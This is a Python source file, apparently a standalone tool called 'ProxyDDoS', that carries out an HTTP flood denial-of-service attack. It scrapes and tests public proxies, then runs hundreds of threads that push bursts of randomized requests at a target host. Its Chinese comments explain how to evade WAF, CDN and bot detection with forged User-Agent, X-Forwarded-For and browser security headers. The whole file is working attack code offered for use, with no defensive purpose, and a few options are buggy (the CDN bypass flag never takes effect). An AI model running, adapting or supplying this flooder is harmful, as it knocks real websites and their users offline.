import ssl
import sys
import time
import socks
import socket
import random
import requests
import threading
from queue import Queue


# ------------------ 設定 ------------------

rand = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
string = ['Hurricane','Proknight','Sockskull','Taixies','Collapser','Deprave','JeiKai','Noro','Ebola']
rInt = random.randint
rC = random.choice
lock = threading.Lock()
q = Queue()
th_list = []
thread_pool = []
download_proxy = []
worked_proxy = []
good_proxies = []
conns = 0
brute = False
cdn = False
pps = False
# ua_list = open('useragent.txt').readlines() # 測試用的 用網路上的列表即可, 不然這種網上的列表 基本都會被WAF規則擋下來
proxy_file = "proxies.txt"
output_file = "dpf.txt"

# ------------------------------------------

def GenUA():
    AW = f"{rInt(500,599)}.36"
    BV = f"{rInt(24,80)}.0.{rInt(3000,4000)}.{rInt(1,200)}"
    OPR = f"{rInt(30,70)}.0.{rInt(1000,4000)}.{rInt(1,1000)}"
    UCB = f"{rInt(5,12)}.{rInt(5,12)}.{rInt(0,10)}.{rInt(1,1000)}"
    devices = rC(["IOS","Windows","X11","Android","Symbian","Macintosh"])
    if devices =="Windows":
        version = rC(
            [
                "Windows NT 10.0; Win64; X64",
                "Windows NT 10.0; WOW64",
                "Windows NT 5.1; rv:7.0.1",
                "Windows NT 6.1; WOW64; rv:54.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64; rv:13.37"
                ])
    elif devices =="IOS":
        version = rC(
            [
                "iPhone; CPU iPhone OS 13_3 like Mac OS X",
                "iPad; CPU OS 13_3 like Mac OS X",
                "iPod touch; iPhone OS 4.3.3",
                "iPod touch; CPU iPhone OS 12_0 like Mac OS X"
            ])
    elif devices =="X11":
        version = rC(
            [
                "X11; Linux x86_64",
                "X11; Ubuntu; Linux i686",
                "SMART-TV; Linux; Tizen 2.4.0",
                "X11; Ubuntu; Linux x86_64",
                "X11; U; Linux amd64",
                "X11; GNU/LINUX",
                "X11; CrOS x86_64 11337.33.7",
                "X11; Debian; Linux x86_64"
            ])
    elif devices =="Android":
        version = rC(
            [
                "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
                "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
                "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
                "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
                "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
                "Linux; Android 6.0; Nexus 5 Build/MRA58N",
                "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
                "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
                "Linux; Android 9.0; SAMSUNG SM-G950U"
            ])
    elif devices =="Macintosh":
        version = rC(
            [
                "Macintosh; Intel Mac OS X 10_14_4",
                "Macintosh; U; Intel Mac OS X 12_10_0"
            ])
    elif devices =="Symbian":
        version = rC(
            [
                "Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1",
                "SymbianOS/9.1; U; en-us",
                "Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"
            ])
    borwser = rC(["chrome","uc","op"])
    if borwser =="chrome":
        return f"User-Agent: Mozilla/5.0 ({version}) AppleWebKit/{AW} (KHTML, like Gecko) Chrome/{BV} Safari/{AW}"
    elif borwser =="op":
        return f"User-Agent: Mozilla/5.0 ({version}) AppleWebKit/{AW} (KHTML, like Gecko) Chrome/{BV} Safari/{AW} OPR/{OPR}"
    elif borwser =="uc":
        return f"User-Agent: Mozilla/5.0 ({version}) AppleWebKit/{AW} (KHTML, like Gecko) Version/4.0 Chrome/{BV} UCBrowser/{UCB} Safari/{AW}"


def is_valid_proxy_format(proxy): #檢測是否為正確的proxy格式
    try:
        proxy_ip, proxy_port = proxy.strip().split(":")
        int(proxy_port)
        return True
    except:
        return False


def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
    global conns
    proxy_ip, proxy_port = proxy.strip().split(":")
    proxy_port = int(proxy_port)

    s = socks.socksocket()
    s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
    s.settimeout(2)

    try:
        s.connect((host, port))
        if port == 443:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)
        s.send(f"HEAD / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode('utf-8'))

        with lock:
            conns += 1
            good_proxies.append(proxy)
            print(f"[ProxyDDoS]->proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m conns: \033[34m{str(conns):^4s}\033[0m >{proto:^5s} \033[32;1mConnected\033[0m")
            print(f'\33]0;[{conns}] Proxies | ProxyChecker Code By GogoZin\a',end='')
    except Exception as e:
        pass
        # print(f"[-] FAIL: {proxy} ({e})")
    finally:
        s.close()

def Proxy_worker(): # 騷操作 多這步 檢測就快了
    while not q.empty():
        proxy = q.get()
        check_proxy(proxy)
        q.task_done()

def load_proxies(): # 加載proxy列表
    with open(proxy_file) as f:
        raw = [line.strip() for line in f if line.strip()]
    return [p for p in raw if is_valid_proxy_format(p)]

def launchChecker(): # 開始檢測proxy
    proxies = load_proxies()
    for proxy in proxies:
        q.put(proxy)

    threads = []
    for _ in range(min(600, len(proxies))):
        t = threading.Thread(target=Proxy_worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    # 儲存成功代理
    with open(output_file, "w") as f:
        for proxy in sorted(set(good_proxies)):
            f.write(proxy + "\n")

    print(f"\n✅ 檢測完成！成功: {len(good_proxies)}, 失敗: {len(proxies) - len(good_proxies)}")
    time.sleep(3)


def GetReferer():
    referers = [ #一些常見的搜尋引擎referer, 現在很少有機制針對referer了 可有可無
        f'https://www.google.com/search?q={host}',
        f'https://www.bing.com/search?q={host}',
        f'https://tw.search.yahoo.com/search?p={host}',
        f'https://duckduckgo.com/?t=h_&q={host}'
    ]

    return random.choice(referers)


def fakeIP(): #假IP 專幹那些低能後端工程師
    ip = ""
    for _ in range(4):
        ip += f".{random.randint(0,254)}"
        # 別懷疑 就是會有低能白癡後端 覺得後台看到的IP會是真的 
        # 這邊觀念宣導, 資料庫抓到的ip 不管從哪個標頭抓的 全部都是可以偽造的
        # X-forwarded-For, Client-IP, Via 等等 數不清的標頭 IP全部都可以偽造
        # 任何傳到後端的資料都是可以經過偽造的 切記 !
        # 只有TCP連線那個IP 才是真的流量來源 (如果是cc就會是代理的IP, botnet就會是bot的ip)
    return ip[1:] # 123.123.123.123


def headerHandle(): #封包標頭處理

    # Http 一般標頭 包含常見的connection跟accept等 
    # 如果網站不在任何雲端節點上 那這些標頭就可以實現癱瘓
    conn = f"Connection: Keep-Alive:823\r\n"
    accept = f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-TW,zh;q=0.5\r\n"
    referer = f"Referer: {GetReferer()}\r\n"
    useragent = f"{GenUA()}\r\n"
    x_for = f"X-Forwarded-For: {fakeIP()}\r\nX-Forwarded-Host: {host}\r\nX-Real-IP: {fakeIP()}\r\n"
    fake = f"Client-IP: {fakeIP()}\r\nVia: 1.1 {host}\r\nForwarded: for={fakeIP()}; proto={proto}; host={host}\r\n"
    cache = f"Cache-Control: no-cache, max-age=0\r\n"
    pri = f"Priority: u=1, i\r\n"
    origin = f"Origin: "
    if port == 443:
        origin += f"https://{host}\r\n"
    else:
        origin += f"http://{host}\r\n"

    # Http 安全性標頭, 大部分主流的瀏覽器都支援了, 是判斷為正常流量 或是機器人的標準之一
    # 新的站點大部分都是預設啟用sec的, 也就是沒有sec的都會被識別為惡意流量
    sec = f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"\r\n"
    sec += f"Sec-Ch-Ua-arch: \"x86\"\r\n"
    sec += f"Sec-Ch-Ua-bitness: \"64\"\r\n"
    sec += f"Sec-Ch-Ua-full-version-list: \"Chromium\";v=\"136.0.0.0\", \"Brave\";v=\"136.0.0.0\", \"Not.A/Brand\";v=\"99.0.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-mobile: ?0\r\n"
    sec += f"Sec-Ch-Ua-model: \"\"\r\n"
    sec += f"Sec-Ch-Ua-platform: \"Windows\"\r\n"
    sec += f"Sec-Ch-Ua-platform-version: \"19.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-wow64: ?0\r\n"
    sec += f"Sec-Fetch-Dest: empty\r\n"
    sec += f"Sec-Fetch-Mode: cors\r\n"
    sec += f"Sec-Fetch-Site: same-origin\r\n"
    sec += f"Sec-Gpc: 1\r\n"

    header = conn + accept + referer + useragent + x_for + fake + cache + pri + origin
    if brute: #如果啟用brute 就最大程度減少標頭 只留關鍵標頭
        header = conn + cache + useragent + x_for + fake
    if cdn == 'bypass': #如果是bypass模式 那就必須加入sec
        header +=sec
    return header #回傳處理好的標頭


def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k的列表 延遲低於1秒 能用的都不會超過400個
    global download_proxy
    print("Auto Proxy Scraper Code By GogoZin")
    time.sleep(2)
    s5URL = [
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all",
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
             "https://www.proxy-list.download/api/v1/get?type=http"
             ]
    
    print("Start Fetch Socks5 Proxies")
    for u in s5URL:
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
            lst = r.text.split("\r\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)
    
    print("Start fetch from geonode ")
    geo = ["https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=2&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=3&sort_by=lastChecked&sort_type=desc"]
    for u in geo:
        r = requests.get(u)
        if r.status_code == 200:
            lst = r.text.split("}")
            # print(lst)
            for lines in lst:
                # print(lines)
                if "ip" and "port" in lines:
                    ip = lines.split("ip\":\"")[1].split("\",\"")[0]
                    port = lines.split("port\":\"")[1].split("\",\"")[0]
                    proxy = ip+":"+port
                download_proxy.append(proxy)
            
        print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
    
    git_proxy_list = [                 #Github proxies is suck, so don't use it
            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/https.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/https.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/http.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/refs/heads/master/generated/http_proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/refs/heads/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Https.txt"
    ]

    print("Start Get Github Proxies")
    for u in git_proxy_list:
        host = u.split(".com/")[1]
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
            lst = r.text.split("\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)
    
    download_proxy = sorted(set(download_proxy))


def launchThreads():
    for _ in range(thr):
        try:
            t = threading.Thread(target=send_requests)
            t.start()
            th_list.append(t)
        except:
            pass


def send_requests(): #傳統HTTP FLOOD
    try:
        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
        proxy_port = int(proxy_port)
    except ValueError:
        return
    if pps:
        header = "Connection: Keep-Alive\r\n"
    else:
        header = headerHandle()
    header += f'\r\n'
    while 1:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
            s.connect((host, port))
            if port == 443:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            try:
                for _ in range(100):
                    s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                print(f"[ProxyDDoS]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
                # s.close()
            except:
                print(f"[ProxyDDoS]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                s.close()
        except:
            s.close()


if __name__ == '__main__':
    if len(sys.argv) < 6:
        print("Usage : proxyddos.py <GET/POST/HEAD> <host> <port> <threads> <path> ")
        print(" --fetch  | For fetch proxies auto")
        print(" --pps    | Flood with no header")
        print(" --brute  | Flood with less header")
        print(" --cdn    | Flood with sec header")
        sys.exit()
    else:
        try:
            if '--pps' in sys.argv:
                pps = True
            if '--brute' in sys.argv:
                brute = True
            if '--cdn' in sys.argv:
                cdn = True
            p_Type = socks.HTTP
            method = str(sys.argv[1]).upper()
            host = str(sys.argv[2])
            port = int(sys.argv[3])
            if port == 443:
                proto = "HTTPS"
            else:
                proto = "HTTP"
            thr = int(sys.argv[4])
            if thr > 800:
                thr = 800
            else:
                thr = thr
            path = str(sys.argv[5])
            version = str(sys.argv[6])
        except Exception as e:
            print(f"Argv Error : {e}")
            sys.exit()
        f = open('proxies.txt','w')
        if "--fetch" in sys.argv:
            ProxyScraper()
        else:
            download_proxy = open(str(input("Enter Your Proxy List File Name : "))).readlines()
        for l in download_proxy:
            f.write(f"{l}\n")
        f.close()
        launchChecker()
        launchThreads()
